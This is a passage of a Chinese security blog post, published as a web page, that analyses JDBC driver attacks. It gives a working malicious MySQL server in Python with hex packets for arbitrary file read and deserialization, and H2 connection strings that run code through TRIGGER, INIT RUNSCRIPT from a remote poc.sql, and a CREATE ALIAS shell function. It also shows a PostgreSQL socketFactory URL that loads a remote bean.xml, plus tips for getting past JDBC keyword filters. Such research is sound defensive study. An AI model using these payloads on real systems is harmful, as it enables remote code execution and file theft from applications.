data: _payload='42000001fb433a5c55736572735c6a69655c4465736b746f705c6c6561726e5c6a6176615c544f4f4c535c6d7973716c5c6c617267655f62696e6172795f66696c652e62696e' send_data(conn,_payload) data=receive_data(conn) data=receive_data(conn) print(data[:100]) elif \"show warnings\" in data: _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000' send_data(conn, _payload) data = receive_data(conn) if \"show warnings\" in data: payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000' send_data(conn, payload) break if __name__ == '__main__': HOST ='0.0.0.0' PORT = 3307 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间 sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\"start fake mysql server listening on {}:{}\".format(HOST,PORT)) run() 测试发现是可行的，就是分析中进入第一个if (client向mysql端请求select一堆东西)，我们直接返回一个MySQL Protocol - local infile数据包，java客户端接收就会去读取文件发送给我们mysql恶意服务端了\n然后分解下MySQL Protocol - local infile流量包\n42 00 00 这个包的总长度(小端序，00 00 42=\u003e66)\n01 Packet Number的值，代表是第一个Packet\nfb 代表LOCAL INFILE Packet 类型\nfb后面的就是文件名了\n也就是需要计算下长度就行了\n0x0end 小结 我们分析可以发现就是，java这边mysql初始化，其实并没有向mysql请求load data local infile，但是却能利用这个点，这其实是java处理mysql返回信息的代码逻辑有关，java客户端发送每个Request Query请求后，处理mysql返回的数据时都会来到TextResultsetReader#read，而这个通过columnCount区分是字段结果还是Response LOCAL INFILE，是Response LOCAL INFILE就会向mysql服务端发送对应的信息\n也就是说，只要java客户端发送Request Query请求，我们就能返回一个Response LOCAL INFILE数据包进行利用\n绕过mysql jdbc 关键字 https://xz.aliyun.com/news/11457?time__1311=eqUxuWexnD0D9DBLPddyBcDBBFI3x\u0026u_atoken=8ee03cc9b663e4d28c492c8e6ed1b121\u0026u_asig=0a472f8317440160773173397e012d\ntrue可以用YES\nmysql 8.0.x 会进行一次url解密，可以套一层url加密\n0x4 H2 $$在h2中代表设置函数\n这里会反射调用我们设置的方法\nload:87, TriggerObject (org.h2.schema) setTriggerAction:149, TriggerObject (org.h2.schema) setTriggerSource:142, TriggerObject (org.h2.schema) update:125, CreateTrigger (org.h2.command.ddl) update:139, CommandContainer (org.h2.command) executeUpdate:304, Command (org.h2.command) executeUpdate:248, Command (org.h2.command) openSession:280, Engine (org.h2.engine) createSession:201, Engine (org.h2.engine) connectEmbeddedOrServer:344, SessionRemote (org.h2.engine) \u003cinit\u003e:124, JdbcConnection (org.h2.jdbc) connect:59, Driver (org.h2) getConnection:681, DriverManager (java.sql) getConnection:252, DriverManager (java.sql) main:9, H2 0x01 TRIGGER RCE javascript 在JDK15 中 JavaScript /Nashorn引擎被彻底移除(也就是jdk15以上用不了//javascript这种方式rce，jsEngine会为null然后空指针报错)\n环境\njdk8u20\ncom.h2database h2 1.4.200 package h2; import java.sql.DriverManager; public class H2 { public static void main(String[] args) throws Exception { Class.forName(\"org.h2.Driver\"); String simplexp2 =\"jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS '//javascript\\n\" + \"Java.type(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"calc\\\")'\"; java.sql.Connection conn = DriverManager.getConnection(simplexp2); } } H2解析流程 先是url，这里ConnectionInfo#readSettingsFromURL会对this.url做处理，原始传入的String u(demo中的simplexp2)在;前的值覆盖给this.url，后面的值再通过;分割成一个array，每组会进行=查找，没有找到会报错\nprivate void readSettingsFromURL() { DbSettings defaultSettings = DbSettings.getDefaultSettings(); int idx = url.indexOf(';'); if (idx \u003e= 0) { String settings = url.substring(idx + 1); url = url.substring(0, idx); String[] list = StringUtils.arraySplit(settings, ';', false); for (String setting : list) { if (setting.isEmpty()) { continue; } int equal = setting.indexOf('='); if (equal \u003c 0) { throw getFormatException(); } ... name是url中后半段值，然后进入parseName()\n我们这里是mem:test，会让persistent = false;\ntcp:和ssl:会开启远程remote=true，后面一处remote的判断会进行远程连接\n上面让persistent = false;是有用的，后面调用getName()时，可以直接返回name（下图我用的mem，所以persistent = false），不然name不符合下面格式会被throw\ninit Engine#openSession\n这里获取到我们设置的INIT，然后进入session.prepareCommand\nString init = ci.removeProperty(\"INIT\", null); 后面h2读取sql命令进行赋值，前面还有很多赋值，这里记录triggerSource的设置\n然后返回，command初始化完成\n然后来到loadFromSource()，调用执行\n利用点在org.h2.schema.TriggerObject#loadFromSource，这里会检验triggerSource，是以//javascript开头会调用下面eval()\n判断开头\n然后先进入getCompiledScript()，这里JDK15 中 JavaScript /Nashorn引擎被彻底移除(也就是jdk15以上用不了//javascript这种方式rce，jsEngine会为null然后空指针报错)\n下图为jdk17版本，jsEngine会为null，下一步就会报错中断\n回到上文new ScriptEngineManager().getEngineByName(lang);看他是怎么获取\n看到names\n“nashorn”, “Nashorn”, “js”, “JS”, “JavaScript\"等\n然后names和我们传入的name进行匹对，匹配到返回初始化的engine\n这里找到javascript就会return，那是不是当javascript被黑名单的时候可以利用上面这些进行绕过呢？\n其实不然hhhh，因为走到这之前就严格对//javascript前缀进行了匹对，且lang也是被限制的\nif (isJavascriptSource(source)) { lang = \"javascript\"; 0x02 绕过//javascript 上面不是说了么，JDK15之后用不了javascript了\nString simplexp2 =\"jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS $$ void shell() throws Exception {\\n\" + \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\")\\\\;}$$\"; java.sql.Connection conn = DriverManager.getConnection(simplexp2); //BEFORE SELECT ON 这里有个细节，shell函数里那个;要转义，不然会被当成h2初始化的参数分割符，导致}$$会被切割掉\n简单分析下 这里跟进到TRIGGER关键字，这个关联后面设置this.triggerSource\n然后我们直接跟到compiler.getMethod()这步\n在跟进getClass(className);\npublic Method getMethod(String className) throws ClassNotFoundException { Class\u003c?\u003e clazz = getClass(className); Method[] methods = clazz.getDeclaredMethods(); ... 这里上面代码获取都是null，然后直接到classLoader.loadClass(packageAndClassName)；\n这里classLoader是SourceCompiler这个类本身，loadClass()里面会调用findClass()来查找类，也就会调用下方的findClass方法，主要逻辑就在这\n先是这里getCompleteSourceCode()会补全完整的class文件的代码，source就是上面shell函数那段代码\n然后通过javaxToolsJavac去加载那个class，然后put到一个map中，并返回这个class对象\n然后就是水到渠成啦，调用invoke触发恶意方法\n0x03 INIT RunScript RCE jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql' poc.sql\nDROP ALIAS IF EXISTS shell; CREATE ALIAS shell AS $$void shell(String s) throws Exception { java.lang.Runtime.getRuntime().exec(s); }$$; SELECT shell('cmd /c calc'); RunScriptCommand#update中，远程poc.sql存储在in中，然后通过while循环执行每一条sql语句，一次执行一条\n$$逻辑 初始化，通过CHAR_DOLLAR_QUOTED_STRING(值为9)，作为占位符\nread的时候通过匹对CHAR_DOLLAR_QUOTED_STRING，得到末位index，然后截取字符串得到我们的函数内容\n绕过$ 然后查看相关代码，发现这里用'也是可以代替$的，但是\"以及其他字符就不好利用了\nH2中\"和`包裹的字符，会被当成字段，read()后会查询这个字段是否存在。所以这里\"双引号代替不了 还有一点是远程获取的问题\n看到r.readStatement();，看下他远程获取的逻辑\n逻辑在ScriptReader#readStatementLoop\n可以看到正常情况读取到;就会结束，但是我们java函数代码语句是需要;后面那个}就会被截断掉\n而这里只有'，\"，$$，/**/,--会一直读取，其包裹的内容\nprivate String readStatementLoop() throws IOException { bufferStart = bufferPos; int c = read(); while (true) { if (c \u003c 0) { endOfFile = true; if (bufferPos - 1 == bufferStart) { return null; } break; } else if (c == ';') { break; } switch (c) { case '$': { c = read(); if (c == '$' \u0026\u0026 (bufferPos - bufferStart \u003c 3 || buffer[bufferPos - 3] \u003c= ' ')) { // dollar quoted string while (true) { c = read(); if (c \u003c 0) { break; } if (c == '$') { c = read(); if (c \u003c 0) { break; } if (c == '$') { break; } } } c = read(); } break; } case '\\'': while (true) { c = read(); if (c \u003c 0) { break; } if (c == '\\'') { break; } } c = read(); break; case '\"': while (true) { c = read(); if (c \u003c 0) { break; } if (c == '\\\"') { break; } } c = read(); break; case '/': { c = read(); if (c == '*') { // block comment startRemark(true); while (true) { c = read(); if (c \u003c 0) { break; } if (c == '*') { c = read(); if (c \u003c 0) { clearRemark(); break; } if (c == '/') { endRemark(); break; } } } c = read(); } else if (c == '/') { // single line comment startRemark(false); while (true) { c = read(); if (c \u003c 0) { clearRemark(); break; } if (c == '\\r' || c == '\\n') { endRemark(); break; } } c = read(); } break; } case '-': { c = read(); if (c == '-') { // single line comment startRemark(false); while (true) { c = read(); if (c \u003c 0) { clearRemark(); break; } if (c == '\\r' || c == '\\n') { endRemark(); break; } } c = read(); } break; } default: { c = read(); } } } return new String(buffer, bufferStart, bufferPos - 1 - bufferStart); } 0x04 H2数据库利用 ALIAS 下载jar，然后我下的是最新版本的，要用jdk17启动，然后直接Connect，就有一个在线h2数据库了\nhttp://www.h2database.com/html/cheatSheet.html\nC:\\Users\\jie\\Desktop\\Java_Test\u003eC:\\MyFiles\\Tools\\ENV\\JAVA\\jdk17\\bin\\java.exe -cp .\\h2-2.3.232.jar org.h2.tools.Server -web -webAllowOthers -ifNotExists Web Console server running at http://192.168.141.1:8082 (others can connect) 回显 但是这个回显感觉不适用于jdbc，简单看了下jdbc代码，没见返回return的地方\nDROP ALIAS IF EXISTS SHELLEXEC ; CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\"; }$$; //调用SHELLEXEC执行命令 CALL SHELLEXEC('whoami'); CALL SHELLEXEC('ipconfig'); 0x4 PostgreSQL 环境\norg.postgresql postgresql 42.3.1 org.springframework spring-core 5.3.28 org.springframework spring-expression 5.3.28 commons-logging commons-logging 1.2 org.springframework spring-beans 5.3.28 org.springframework spring-context 5.3.28 package PostgreSQL; import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLException; public class PsqlJDBCRCE { public static void main(String[] args) throws SQLException { String socketFactoryClass = \"org.springframework.context.support.ClassPathXmlApplicationContext\"; String socketFactoryArg = \"http://127.0.0.1:8000/bean.xml\"; String jdbcUrl = \"jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=\"+socketFactoryClass+ \"\u0026socketFactoryArg=\"+socketFactoryArg; Connection connection = DriverManager.getConnection(jdbcUrl); } } 0x01 分析 Driver这里对参数进行分类\nSocketFactoryFactory这里读取出工厂类，并通过ObjectFactory.instantiate()实例化这个类\n最后一个参数 PGProperty.SOCKET_FACTORY_ARG.get(info) 获取的我们传入的socketFactoryArg\n然后这里自构方法调用是有顺序的\nProperties.class 参数类型的\n没有才会调用 String.class\n这里虽然要看tryString参数，但是在上一步，这个地方是写死的为true\nreturn (SocketFactory)ObjectFactory.instantiate(socketFactoryClassName, info, true, PGProperty.SOCKET_FACTORY_ARG.get(info)); 最后才会调用 无参自构方法\n然后如果是String.class，参数值就是我们设置的socketFactoryArg\n0x02 ClassPathXmlApplicationContext 之后则调用了ClassPathXmlApplicationContext String.class的自构方法\nnew ClassPathXmlApplicationContext(\"http://127.0.0.1:8000/bean.xml\"); 跟随调用refreshBeanFactory()这里去接收bean.xml数据，生成this.beanFactory对象\nloadBeanDefinitions()里会去请求设置的地址\n",
  "wordCount" : "10953",
  "inLanguage": "zh",
  "datePublished": "2025-02-25T20:01:23+08:00",
  "dateModified": "2025-02-25T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/jdbc/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="首页">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="分类">
                    <span>分类</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="搜索🔍︎">
                    <span>搜索🔍︎</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">🏠主页</a>&nbsp;»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      JDBC综合分析
    </h1>
    <div class="post-meta"><span title='2025-02-25 20:01:23 +0800 CST'>2025-02-25</span>&nbsp;·&nbsp;22 分钟&nbsp;·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">目录</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#0x1-mysql-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="0x1 Mysql 反序列化">0x1 Mysql 反序列化</a><ul>
                            
                    <li>
                        <a href="#0x01-%e5%88%86%e6%9e%90" aria-label="0x01 分析">0x01 分析</a><ul>
                            
                    <li>
                        <a href="#queryinterceptors" aria-label="queryInterceptors">queryInterceptors</a></li>
                    <li>
                        <a href="#%e5%bc%80%e5%a4%b4" aria-label="开头">开头</a></li>
                    <li>
                        <a href="#autodeserialize" aria-label="autoDeserialize">autoDeserialize</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x02-mysql%e6%81%b6%e6%84%8f%e6%9c%8d%e5%8a%a1%e6%9e%84%e9%80%a0" aria-label="0x02 mysql恶意服务构造">0x02 mysql恶意服务构造</a><ul>
                            
                    <li>
                        <a href="#%e6%b5%81%e9%87%8f%e5%b1%82%e9%9d%a2" aria-label="流量层面">流量层面</a></li>
                    <li>
                        <a href="#%e6%9e%84%e9%80%a0%e6%95%b0%e6%8d%ae%e5%8c%85" aria-label="构造数据包">构造数据包</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#0x2-mysql-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96--ssrf" aria-label="0x2 Mysql 任意文件读取 &amp;amp; SSRF">0x2 Mysql 任意文件读取 &amp; SSRF</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#mysql-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96%e5%8e%9f%e7%90%86" aria-label="Mysql 任意文件读取原理">Mysql 任意文件读取原理</a></li></ul>
                        
                    <li>
                        <a href="#0x01-%e5%88%86%e6%9e%90-1" aria-label="0x01 分析">0x01 分析</a><ul>
                            
                    <li>
                        <a href="#mysql-ssrf" aria-label="[*]Mysql SSRF">[*]Mysql SSRF</a></li>
                    <li>
                        <a href="#packet-length-%e9%aa%8c%e8%af%81" aria-label="Packet Length 验证">Packet Length 验证</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x02-%e6%81%b6%e6%84%8f%e6%9c%8d%e5%8a%a1%e6%9e%84%e9%80%a0" aria-label="0x02 恶意服务构造">0x02 恶意服务构造</a></li>
                    <li>
                        <a href="#0x0end-%e5%b0%8f%e7%bb%93" aria-label="0x0end 小结">0x0end 小结</a></li>
                    <li>
                        <a href="#%e7%bb%95%e8%bf%87mysql-jdbc-%e5%85%b3%e9%94%ae%e5%ad%97" aria-label="绕过mysql jdbc 关键字">绕过mysql jdbc 关键字</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x4-h2" aria-label="0x4 H2">0x4 H2</a><ul>
                            
                    <li>
                        <a href="#0x01-trigger-rce" aria-label="0x01 TRIGGER RCE">0x01 TRIGGER RCE</a><ul>
                            
                    <li>
                        <a href="#javascript" aria-label="javascript">javascript</a></li>
                    <li>
                        <a href="#h2%e8%a7%a3%e6%9e%90%e6%b5%81%e7%a8%8b" aria-label="H2解析流程">H2解析流程</a></li>
                    <li>
                        <a href="#init" aria-label="init"><strong>init</strong></a></li></ul>
                    </li>
                    <li>
                        <a href="#0x02-%e7%bb%95%e8%bf%87javascript" aria-label="0x02 绕过//javascript">0x02 绕过//javascript</a><ul>
                            
                    <li>
                        <a href="#%e7%ae%80%e5%8d%95%e5%88%86%e6%9e%90%e4%b8%8b" aria-label="简单分析下"><strong>简单分析下</strong></a></li></ul>
                    </li>
                    <li>
                        <a href="#0x03-init-runscript-rce" aria-label="0x03 INIT RunScript RCE">0x03 INIT RunScript RCE</a><ul>
                            
                    <li>
                        <a href="#%e9%80%bb%e8%be%91" aria-label="$$逻辑">$$逻辑</a></li>
                    <li>
                        <a href="#%e7%bb%95%e8%bf%87" aria-label="绕过$">绕过$</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x04-h2%e6%95%b0%e6%8d%ae%e5%ba%93%e5%88%a9%e7%94%a8-alias" aria-label="0x04 H2数据库利用 ALIAS">0x04 H2数据库利用 ALIAS</a><ul>
                            
                    <li>
                        <a href="#%e5%9b%9e%e6%98%be" aria-label="回显">回显</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#0x4-postgresql" aria-label="0x4 PostgreSQL">0x4 PostgreSQL</a><ul>
                            
                    <li>
                        <a href="#0x01-%e5%88%86%e6%9e%90-2" aria-label="0x01 分析">0x01 分析</a></li>
                    <li>
                        <a href="#0x02-classpathxmlapplicationcontext" aria-label="0x02 ClassPathXmlApplicationContext">0x02 ClassPathXmlApplicationContext</a></li></ul>
                    </li>
                    <li>
                        <a href="#jdbc-%e6%80%bb%e4%bd%93%e5%88%86%e6%9e%90-%e7%90%86%e8%a7%a3" aria-label="JDBC 总体分析 理解">JDBC 总体分析 理解</a></li>
                    <li>
                        <a href="#0x5-end-jdbcjndi" aria-label="0x5 End JDBC&#43;JNDI">0x5 End JDBC+JNDI</a></li>
                    <li>
                        <a href="#%e5%8f%82%e8%80%83" aria-label="参考"><strong>参考</strong></a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h1 id="0x1-mysql-反序列化">0x1 Mysql 反序列化<a hidden class="anchor" aria-hidden="true" href="#0x1-mysql-反序列化">#</a></h1>
<blockquote>
<p>前言：java调试这边分析完了，但是又很想了解这个mysql恶意服务是怎么搭建的，于是就再从流量层面简单分析了下mysql协议，以及按照自己的思路<code>改造</code>了下mysql恶意服务。感觉有了跟深刻的理解hh</p>
</blockquote>
<p><strong>环境</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>mysql<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>mysql-connector-java<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>8.0.12<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>commons-collections<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>commons-collections<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><p>客户端</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">mysql</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">mysql_learn</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">ClassName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;com.mysql.jdbc.Driver&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">JDBC_Url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;jdbc:mysql://127.0.0.1:3307/newtest?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;root&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;123456&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">ClassName</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Connection</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">JDBC_Url</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Connection connection = DriverManager.getConnection(JDBC_Url);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>恶意mysql服务器</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">greeting_data</span><span class="o">=</span><span class="s2">&#34;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">response_ok_data</span><span class="o">=</span><span class="s2">&#34;0700000200000002000000&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Receiveing the package : </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
